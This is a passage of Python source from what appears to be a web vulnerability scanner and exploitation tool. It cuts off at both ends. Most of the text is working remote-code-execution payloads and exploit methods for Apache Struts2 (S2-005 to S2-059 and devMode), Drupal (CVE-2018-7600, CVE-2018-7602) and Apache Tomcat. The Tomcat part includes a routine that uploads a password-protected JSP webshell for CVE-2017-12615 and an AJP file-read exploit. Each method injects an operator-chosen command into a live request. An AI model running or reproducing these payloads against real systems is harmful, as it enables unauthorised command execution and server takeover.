            r"'-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redi" \
            r"rectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apach" \
            r"e.struts2.ServletActionContext@getResponse().getOutputStream()" \
            r")).(@org.apache.commons.io.IOUtils@copy(#process.getInputStrea" \
            r"m(),#ros)).(#ros.close())}"
        self.payload_s2_052='''<map> <entry> <jdk.nashorn.internal.objects''' \
            '''.NativeString> <flags>0</flags> <value class="com.sun.xml.i''' \
            '''nternal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHand''' \
            '''ler> <dataSource class="com.sun.xml.internal.ws.encoding.xm''' \
            '''l.XMLMessage$XmlDataSource"> <is class="javax.crypto.Cipher''' \
            '''InputStream"> <cipher class="javax.crypto.NullCipher"> <ini''' \
            '''tialized>false</initialized> <opmode>0</opmode> <serviceIte''' \
            '''rator class="javax.imageio.spi.FilterIterator"> <iter class''' \
            '''="javax.imageio.spi.FilterIterator"> <iter class="java.util''' \
            '''.Collections$EmptyIterator"/> <next class="java.lang.Proces''' \
            '''sBuilder"> <command> <string>RECOMMAND</string> </command> ''' \
            '''<redirectErrorStream>false</redirectErrorStream> </next> </''' \
            '''iter> <filter class="javax.imageio.ImageIO$ContainsFilter">''' \
            ''' <method> <class>java.lang.ProcessBuilder</class> <name>sta''' \
            '''rt</name> <parameter-types/> </method> <name>foo</name> </f''' \
            '''ilter> <next class="string">foo</next> </serviceIterator> <''' \
            '''lock/> </cipher> <input class="java.lang.ProcessBuilder$Nul''' \
            '''lInputStream"/> <ibuffer></ibuffer> <done>false</done> <ost''' \
            '''art>0</ostart> <ofinish>0</ofinish> <closed>false</closed> ''' \
            '''</is> <consumed>false</consumed> </dataSource> <transferFla''' \
            '''vors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.n''' \
            '''ashorn.internal.objects.NativeString> <jdk.nashorn.internal''' \
            '''.objects.NativeString reference="../jdk.nashorn.internal.ob''' \
            '''jects.NativeString"/> </entry> <entry> <jdk.nashorn.interna''' \
            '''l.objects.NativeString reference="../../entry/jdk.nashorn.i''' \
            '''nternal.objects.NativeString"/> <jdk.nashorn.internal.objec''' \
            '''ts.NativeString reference="../../entry/jdk.nashorn.internal''' \
            '''.objects.NativeString"/> </entry> </map>'''
        self.payload_s2_057=r"/struts2-showcase/"+"%24%7B%0A(%23dm%3D%40ognl" \
            r".OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B's" \
            r"truts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensympho" \
            r"ny.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInsta" \
            r"nce(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou." \
            r"getExcludedPackageNames().clear()).(%23ou.getExcludedClasses()" \
            r".clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang." \
            r"Runtime%40getRuntime().exec('RECOMMAND')).(%40org.apache.commo" \
            r"ns.io.IOUtils%40toString(%23a.getInputStream()))%7D"+"/actionC" \
            r"hain1.action"
        self.payload_s2_059=r"id=%25%7b%23_memberAccess.allowPrivateAccess%3" \
            r"Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_" \
            r"memberAccess.excludedClasses%3D%23_memberAccess.acceptProperti" \
            r"es%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_member" \
            r"Access.acceptProperties%2C%23res%3D%40org.apache.struts2.Servl" \
            r"etActionContext%40getResponse().getWriter()%2C%23a%3D%40java.l" \
            r"ang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%2" \
            r"3a.exec('RECOMMAND').getInputStream()).useDelimiter('%5C%5C%5C" \
            r"%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.p" \
            r"rint(%23str)%2C%23res.close()%0A%7d"
        self.payload_s2_devMode = r"?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" \
            r"%3F(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toS" \
            r"tring(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toStri" \
            r"ng.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=RECOMMAND"


    def s2_005(self):
        self.pocname = "Apache Struts2: S2-005"
        self.payload = self.payload_s2_005.replace("RECOMMAND",CMD)
        self.rawdata = "null"
        self.method = "post"
        self.info = color.rce()
        try:
            self.request = requests.post(self.url, headers=headers, data=self.payload, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
            
    def s2_008(self):
        self.pocname = "Apache Struts2: S2-008"
        self.payload = self.payload_s2_008.replace("RECOMMAND", CMD)
        self.rawdata = "null"
        self.method = "get"
        self.info = color.rce()
        try:
            self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)          

    def s2_009(self):
        self.pocname = "Apache Struts2: S2-009"
        self.rawdata = "null"
        self.method = "post"
        self.payload = self.payload_s2_009.replace("RECOMMAND", CMD)
        self.info = color.rce()
        try:
            self.request=requests.post(self.url, data=self.payload, headers=headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)    

    def s2_013(self):
        self.pocname = "Apache Struts2: S2-013"
        self.method = "get"
        self.rawdata = "null"
        self.payload = self.payload_s2_013.replace("RECOMMAND", CMD)
        self.info = color.rce()
        try:
            self.request=requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  

    def s2_015(self):
        self.pocname = "Apache Struts2: S2-015"
        self.method = "get"
        self.payload = self.payload_s2_015.replace("RECOMMAND", CMD)
        self.rawdata = "null"
        self.info = color.rce()
        try:
            self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  

    def s2_016(self):
        self.pocname = "Apache Struts2: S2-016"
        self.payload_1 = self.payload_s2_016_1.replace("RECOMMAND", CMD)
        self.payload_2 = self.payload_s2_016_2
        self.rawdata = "null"
        self.info = color.rce()
        self.method = "get"
        try:
            self.request = requests.get(self.url+self.payload_1, headers=headers, timeout=TIMEOUT, verify=False)
            if VULN is None:
                if r"LISTEN" in self.request.text:
                    self.method = "get"
                    self.rawdata = dump.dump_all(self.request).decode('utf-8')
                    verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
                else:
                    try:
                        self.request = requests.post(self.url, data=self.payload_2, headers=headers, timeout=TIMEOUT, verify=False)
                        self.method = "post"
                        self.rawdata = dump.dump_all(self.request).decode('utf-8')
                        verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
                    except requests.exceptions.Timeout as error:
                        verify.timeout_output(self.pocname)
                    except requests.exceptions.ConnectionError as error:
                        verify.connection_output(self.pocname)
                    except Exception as error:
                        verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
            else:
                self.request = requests.get(self.url+self.payload_1, headers=headers, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8')
                verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  

    def s2_029(self):
        self.pocname = "Apache Struts2: S2-029"
        self.payload = self.payload_s2_029.replace("RECOMMAND", CMD)
        self.method = "get"
        self.rawdata = "null"
        self.info = color.rce()
        try:
            self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  

    def s2_032(self):
        self.pocname = "Apache Struts2: S2-032"
        self.payload = self.payload_s2_032.replace("RECOMMAND",CMD)
        self.method = "get"
        self.rawdata = "null"
        self.info = color.rce()
        try:
            self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  

    def s2_045(self):
        self.pocname = "Apache Struts2: S2-045"
        self.page = "null"
        self.vuln_number = 0
        self.method = "get"
        self.headers1 = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'Content-Type': '${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].' 
                'addHeader("FUCK",233*233)}.multipart/form-data'
        }
        self.headers2 = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'Content-Type': self.payload_s2_045.replace("RECOMMAND", CMD)
        }
        self.rawdata = "null"
        self.info = color.rce()
        try:
            if VULN is None:
                self.request = requests.get(self.url, headers=self.headers1, timeout=TIMEOUT, verify=False)
                if r"54289" in self.request.headers['FUCK']:
                    vuln_number = 1
                    self.fuck045 = self.request.headers['FUCK']
                    self.rawdata = dump.dump_all(self.request).decode('utf-8')
                    verify.generic_output(self.fuck045, self.pocname, self.method, self.rawdata, self.info)
                else:
                    try:
                        self.request = urllib.request.Request(self.url, headers=self.headers2)
                        self.page = urllib.request.urlopen(self.request, timeout=TIMEOUT).read()
                    except http.client.IncompleteRead as error:
                        self.page = error.partial
                    except Exception as error:
                        self.text045 = str(error)
                        if r"timed out" in self.text045:
                            verify.timeout_output(self.pocname)
                        elif r"Connection refused" in self.text045:
                            verify.connection_output(self.pocname)
                        else:
                            verify.generic_output(self.text045, self.pocname, self.method, self.rawdata, self.info)
                    try:
                        self.r = self.page.decode("utf-8")  
                    except:
                        self.r = self.page.decode("gbk")
                    else:
                        self.r = bytes.decode(self.page)
                    verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                try:
                    self.request = urllib.request.Request(self.url, headers=self.headers2)
                    self.page = urllib.request.urlopen(self.request, timeout=TIMEOUT).read()
                except http.client.IncompleteRead as error:
                    self.page = error.partial
                    self.r = self.page.decode("utf-8")  
                    print (self.r)
                    verify.generic_output(self.page, self.pocname, self.method, self.rawdata, self.info)
                except Exception as error:
                    self.text045 = str(error)
                    if r"timed out" in self.text045:
                        verify.timeout_output(self.pocname)
                    elif r"Connection refused" in self.text045:
                        verify.connection_output(self.pocname)
                    else:
                        # print ("?")
                        verify.generic_output(self.text045, self.pocname, self.method, self.rawdata, self.info)
                try:
                    self.r = self.page.decode("utf-8")  
                except:
                    self.r = self.page.decode("gbk")
                else:
                    self.r = bytes.decode(self.page)
                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)                        
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 

    def s2_046(self):
        self.pocname = "Apache Struts2: S2-046"
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'Content-Type':'multipart/form-data; boundary=---------------------------'
        }
        self.rawdata = "null"
        self.info = color.rce()
        self.method = "post"
        self.payload = self.payload_s2_046.replace("RECOMMAND",CMD)
        try:
            self.request = requests.post(self.url, data=self.payload, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 

    def s2_048(self):
        self.pocname = "Apache Struts2: S2-048"
        self.method = "post"
        self.rawdata = "null"
        self.info = color.rce()
        self.method = "post"
        if r"saveGangster.action" not in self.url:
            self.u = self.url+"/integration/saveGangster.action"
        self.data = {
            'name': self.payload_s2_048.replace("RECOMMAND",CMD),
            'age': '233',
            '__checkbox_bustedBefore': 'true',
            'description': '233'
        }
        try:
            self.request = requests.post(self.u, data=self.data, headers=headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 

    def s2_052(self):
        self.pocname = "Apache Struts2: S2-052"
        self.payload = self.payload_s2_052.replace("RECOMMAND",CMD)
        self.method = "post"
        self.rawdata = "null"
        self.info = color.rce()
        self.headers = {
            'Accept': 'text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'User-agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'Content-Type': 'application/xml'
        }
        try:
            self.request = requests.post(self.url, data=self.payload, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 

    def s2_057(self):
        self.pocname = "Apache Struts2: S2-057"
        self.method = "get"
        self.rawdata = "null"
        self.info = color.rce()
        self.payload = self.payload_s2_057.replace("RECOMMAND",CMD)
        try:
            self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            self.page = self.request.text
            self.etree = html.etree
            self.page = self.etree.HTML(self.page)
            self.data = self.page.xpath('//footer/div[1]/p[1]/a[1]/@*')
            verify.generic_output(self.data, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 

    def s2_059(self):
        self.pocname = "Apache Struts2: S2-059"
        self.method = "post"
        self.rawdata = "null"
        self.info = color.rce()
        self.payload = self.payload_s2_059.replace("RECOMMAND",CMD)
        try:
            self.request = requests.post(self.url, data=self.payload, headers=headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 

    def s2_devMode(self):
        self.pocname = "Apache Struts2: S2-devMode"
        self.method = "get"
        self.rawdata = "null"
        self.info = color.rce()
        self.payload = self.payload_s2_devMode.replace("RECOMMAND",CMD)
        try:
            self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False, allow_redirects=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 



class ApacheTomcat():
    def __init__(self, url):
        self.url = url
        self.getipport = urlparse(self.url)
        self.hostname = self.getipport.hostname
        self.port = self.getipport.port
        # Do not use the payload:CVE-2017-12615 when checking
        # Use the payload:CVE-2017-12615 when exploiting
        # Because it is too harmful
        self.payload_cve_2017_12615='<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><' \
            '%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro =' \
            ' Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInpu' \
            'tStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.cl' \
            'ose();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("password".equ' \
            'als(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCm' \
            'd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'
    def tomcat_examples(self):
        self.pocname = "Apache Tomcat: Examples File"
        self.info = "null"
        self.rawdata = "null"
        self.method = "get"
        self.payload = "/examples/servlets/servlet/SessionExample"
        self.info = color.green("[url:"+self.url+self.payload+" ]")
        self.r = "PoCWating"
        try:
            self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
            if self.request.status_code == 200 and r"Session ID:" in self.request.text:
                self.r = "PoCSuCCeSS"
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)               
                
        
    def cve_2017_12615(self):
        self.pocname = "Apache Tomcat: CVE-2017-12615"
        self.name = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
        self.webshell = "/"+self.name+".jsp/"
        self.info = "null"
        self.payload1 = ":-)"
        self.payload2 = self.payload_cve_2017_12615
        self.rawdata = "null"
        try:
            self.method = "put"
            if VULN is None:
                self.request = requests.put(self.url+self.webshell, data=self.payload1, headers=headers, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8')
                self.request = requests.get(self.url+self.webshell[:-1], headers=headers, timeout=TIMEOUT, verify=False)
                self.info = color.upload()+color.green(" [url:"+self.url+"/"+self.name+".jsp ]")
                #self.info = vulninfo.info_cve201712615(self.url)
                verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.request = requests.put(self.url+self.webshell, data=self.payload2, headers=headers, timeout=TIMEOUT, verify=False)
                self.urlcmd = self.url+"/"+self.name+".jsp?pwd=password&cmd="+CMD
                self.request = requests.get(self.urlcmd, headers=headers, timeout=TIMEOUT, verify=False)
                self.r = "Put Webshell: "+self.urlcmd+"\n-------------------------\n"+self.request.text
                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def cve_2020_1938(self):
        self.pocname = "Apache Tomcat: CVE-2020-1938"
        self.output_method = "ajp"
        self.default_port = self.port
        self.default_requri = '/'
        self.default_headers = {}
        self.username = None
        self.password = None
        self.getipport = urlparse(self.url)
        self.hostname = self.getipport.hostname
        self.request = "null"
        self.rawdata = ">_< Tomcat cve-2020-2019 vulnerability uses AJP protocol detection\n" 
        self.rawdata += ">_< So there is no HTTP protocol request and response"
        if VULN is not None:
            self.default_file = CVE20201938
        else:
            self.default_file = "WEB-INF/web.xml"
        self.info = color.contains()+color.green(" [port:"+str(self.default_port)+" file:"+self.default_file+"]")
        try:
            socket.setdefaulttimeout(TIMEOUT)
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.connect((self.hostname, self.default_port))
            self.stream = self.socket.makefile("rb", buffering=0) #PY2: bufsize=0
            self.attributes = [
                {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']},
                {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', self.default_file]},
                {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']},
            ]
            method = 'GET'
            self.forward_request = ApacheTomcat.__prepare_ajp_forward_request(self, self.hostname, self.default_requri, method=AjpForwardRequest.REQUEST_METHODS.get(method))
            if self.username is not None and self.password is not None:
                self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic "+ str(("%s:%s" %(self.username, self.password)).encode('base64').replace("\n" ""))
            for h in self.default_headers:
                self.forward_request.request_headers[h] = headers[h]
            for a in self.attributes:
                self.forward_request.attributes.append(a)
            self.responses = self.forward_request.send_and_receive(self.socket, self.stream)
            if len(self.responses) == 0:
                return None, None
            self.snd_hdrs_res = self.responses[0]
            self.data_res = self.responses[1:-1]
            self.request = (b"".join([d.data for d in self.data_res]).decode())
            #print ((b"".join([d.data for d in self.data_res]).decode()))
            #return self.snd_hdrs_res, self.data_res
            #print (self.request)
            verify.generic_output(self.request, self.pocname, self.output_method, self.rawdata, self.info)
        except socket.timeout as error:
            verify.timeout_output(self.pocname)
        except Exception as error:
            verify.generic_output(self.request, self.pocname, self.output_method, self.rawdata, self.info)

    # Apache Tomcat CVE-2020-1938 "AJP" protocol check def
    def __prepare_ajp_forward_request(self, target_host, req_uri, method=AjpForwardRequest.GET):
        self.fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
        self.fr.method = method
        self.fr.protocol = "HTTP/1.1"
        self.fr.req_uri = req_uri
        self.fr.remote_addr = target_host
        self.fr.remote_host = None
        self.fr.server_name = target_host
        self.fr.server_port = 80
        self.fr.request_headers = {
            'SC_REQ_ACCEPT': 'text/html, application/xhtml+xml, application/xml;q=0.9, image/webp,*/*;q=0.8',
            'SC_REQ_CONNECTION': 'keep-alive',
            'SC_REQ_CONTENT_LENGTH': '0',
            'SC_REQ_HOST': target_host,
            'SC_REQ_USER_AGENT': 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0',
            'Accept-Encoding': 'gzip, deflate, sdch',
            'Accept-Language': 'en-US, en;q=0.5',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        self.fr.is_ssl = False
        self.fr.attributes = []
        return self.fr

class Drupal():
    def __init__(self, url):
        self.url = url
        self.payload_cve_2018_7600 = ("form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=system&mail"
            "[#type]=markup&mail[#markup]=RECOMMAND")
        self.payload_cve_2019_6340 = "{\r\n\"link\":[\r\n{\r\n\"value\":\"link\",\r\n\"options\":\"O:24:\\\"" \
            "GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\\"" \
            ";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\HandlerStack\\\":3:{s:32:\\\"\\u0000GuzzleHttp" \
            "\\\\HandlerStack\\u0000handler\\\";s:%s:\\\"%s\\\";s:30:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\" \
            "u0000stack\\\";a:1:{i:0;a:1:{i:0;s:6:\\\"system\\\";}}s:31:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\" \
            "u0000cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve" \
            "\\\";}}\"\r\n}\r\n],\r\n\"_links\":{\r\n\"type\":{\r\n\"href\":\"%s/rest/type/shortcut/default" \
            "\"\r\n}\r\n}\r\n}"
            
    def cve_2018_7600(self):
        self.pocname = "Drupal: CVE-2018-7600"
        self.method = "post"
        self.rawdata = "null"
        self.info = color.rce()
        self.r = "PoCWating"
        self.payload = self.payload_cve_2018_7600.replace("RECOMMAND", CMD)
        self.path = "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" 
        try:
            if VULN is None:
                self.request = requests.post(self.url + self.path, data=self.payload, headers=headers, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8')
                if r"LISTEN" not in self.request.text and r"class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E" in self.request.text:
                    self.r = "PoCSuCCeSS"
                    verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                else:
                    verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.request = requests.post(self.url + self.path, data=self.payload, headers=headers, timeout=TIMEOUT, verify=False)
                verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
            
    def cve_2018_7602(self):
        self.pocname = "Drupal: CVE-2018-7602"
        self.method = "get"
        self.rawdata = "null"
        self.info = color.rce()
        self.r = "PoCWating"
        try:
            if VULN is None:
                self.request = requests.get(self.url + "/CHANGELOG.txt", data=self.payload, headers=headers, 
                    timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8')
                self.allver = re.findall(r"([\d][.][\d]?[.]?[\d])", self.request.text)
                if self.request.status_code == 200:
                    if '7.59' not in self.allver and '8.5.3' not in self.allver:
                        self.r = "PoCSuCCeSS"
                        self.info += color.green(" [drupal:" + self.allver[0] + "]")
                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.session = requests.Session()
                self.get_params = {'q':'user/login'}
                self.post_params = {'form_id':'user_login', 'name': DRUPAL_U, 'pass' : DRUPAL_P, 'op':'Log in'}
                self.session.post(self.url, params=self.get_params, data=self.post_params, headers=headers, 
                    timeout=TIMEOUT, verify=False)
                self.get_params = {'q':'user'}
                self.r = self.session.get(self.url, params=self.get_params, headers=headers, timeout=TIMEOUT, verify=False)
                self.soup = BeautifulSoup(self.r.text, "html.parser")
                self.user_id = self.soup.find('meta', {'property': 'foaf:name'}).get('about')
                if "?q=" in self.user_id:
                    self.user_id = self.user_id.split("=")[1]
                self.get_params = {'q': self.user_id + '/cancel'}
                self.r = self.session.get(self.url, params=self.get_params, headers=headers, timeout=TIMEOUT, verify=False)
                self.soup = BeautifulSoup(self.r.text, "html.parser")
                self.form = self.soup.find('form', {'id': 'user-cancel-confirm-form'})
                self.form_token = self.form.find('input', {'name': 'form_token'}).get('value')
                self.get_params = {'q': self.user_id + '/cancel', 
                    'destination' : self.user_id +'/cancel?q[%23post_render][]=passthru&q[%23type]=markup&q[%23markup]=' + CMD}
                self.post_params = {'form_id':'user_cancel_confirm_form','form_token': self.form_token, 
                    '_triggering_element_name':'form_id', 'op':'Cancel account'}
                self.r = self.session.post(self.url, params=self.get_params, data=self.post_params, headers=headers, 
                    timeout=TIMEOUT, verify=False)
                self.soup = BeautifulSoup(self.r.text, "html.parser")
                self.form = self.soup.find('form', {'id': 'user-cancel-confirm-form'})
                self.form_build_id = self.form.find('input', {'name': 'form_build_id'}).get('value')
                self.get_params = {'q':'file/ajax/actions/cancel/#options/path/' + self.form_build_id}
                self.post_params = {'form_build_id':self.form_build_id}
                self.r = self.session.post(self.url, params=self.get_params, data=self.post_params, headers=headers, 
                    timeout=TIMEOUT, verify=False)
                verify.generic_output(self.r.text, self.pocname, self.method, self.rawdata, self.info) 
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
